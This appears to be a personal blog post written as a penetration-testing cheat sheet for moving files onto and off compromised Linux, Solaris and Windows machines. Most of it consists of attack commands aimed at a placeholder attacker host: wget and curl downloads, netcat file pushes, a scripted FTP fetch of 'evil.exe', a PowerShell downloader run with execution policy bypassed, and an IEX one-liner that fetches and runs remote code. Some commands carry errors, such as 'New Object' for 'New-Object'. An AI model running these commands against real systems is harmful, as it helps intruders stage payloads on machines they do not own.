---
layout: single
title: '<span class="Articles"> Transfering data W|L - /Articles</span>'
excerpt: "while you are trying to privilage escalating you might need to know how to transfer archives or binaries "
date: 2023-04-26
header:

  teaser_home_page: true



categories:

  - article
  - web
  - files
tags:  
  - windows
  - Solaris
  - linux
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---


while you are trying to privilage escalating you might need to know how to transfer archives or binaries
i recommend you to execute ```which``` before you try the following binaries in order to know ```which``` binaries are available in our machina; in the target machine 

examples

## Solaris and Linux

# Rsync

```rsync -az source destination```
# Python

```php
Python SimpleHTTPServer
```

```on Attacker```
```bash
python -m SimpleHTTPServer 80
```

```on target```
```bash
wget <attackerip>:80/filename
```



# Apache

```on Attacker```

```bash
cp filetoYouWantsend.txt /var/www/html
service apache2 start
```

```on target```
```bash
wget http://attackerip/file
```
```bash
curl http://attackerip/file > file
```
```bash
fetch http://attackerip/file  ```on BSD```
```


# Netcat

```Listen on your own machine```
```php
nc -lvp 4444 > file
```
```send to the Target machine```
```bash

nc <kali_ip> 4444 < file
```



# Netcat + Python


```on Attacker```
```bash
python -m http.server 90
```
```on target```

```wget <attackerip>:90/filename```



# Netcat 


```Listen on your own machine```

nc -lvp 4444 > file

```on target, wait for the file```
nc -nvlp 55555 > file

```on kali, push the file```
nc $victimip 55555 < file


----------------------

## God to know Linux|Solaris:

```To send the executable file to your machine```:

```bash
base64 executable
# copy the output
# paste it in a file called file.txt
# decode it and create the executable
base64 -d file.txt > executable
```
## Windows 


# TFTP
```Windows XP and Win 2003 contain tftp client. Windows 7 do not by default```
```tfpt clients are usually non-interactive, so they could work through an obtained shell```

atftpd --daemon --port 69 /tftp
Windows> tftp -i 192.168.30.45 GET nc.exe



FTP (pyftpdlib client on Kali)
```Ftp is generally installed on Windows machines```

# To make it interactive, use -s option

```On Parrot install a ftp client and set a username/password```

```bash
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21
```

```on Windows```

```bash
ftp <attackerip>
> binary
> get exploit.exe
```


# FTP (pureftpd client on parrot)

```on your own machine ```

```bash
 install ftp client

$ apt-get install pure-ftpd

 create a group

$groupadd ftpgroup

 add a user

$ useradd -g ftpgroup -d /dev/null -s /etc ftpuser

Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/zek).

$ mkdir /root/ftphome

 Create a ftp-user, in our example "zek" (again you can set "-d /root/ftphome/zek/" if you want to).

$ pure-pw useradd zek -u ftpuser -g ftpgroup -d /root/ftphome/
 Update the ftp database after adding our new user.

$ pure-pw mkdb

 change ownership of the specified ftp directory (and all it's sub-direcotries) 

$ chown -R ftpuser:ftpgroup /root/ftphome

 restart Pure-FTPD
 
$ /etc/init.d/pure-ftpd restart
```

```On Windows target machine```

```bash
echo open <attackerip> 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```



# Powershell
```bash 
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


# Powershell download a file
```bash
powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
```
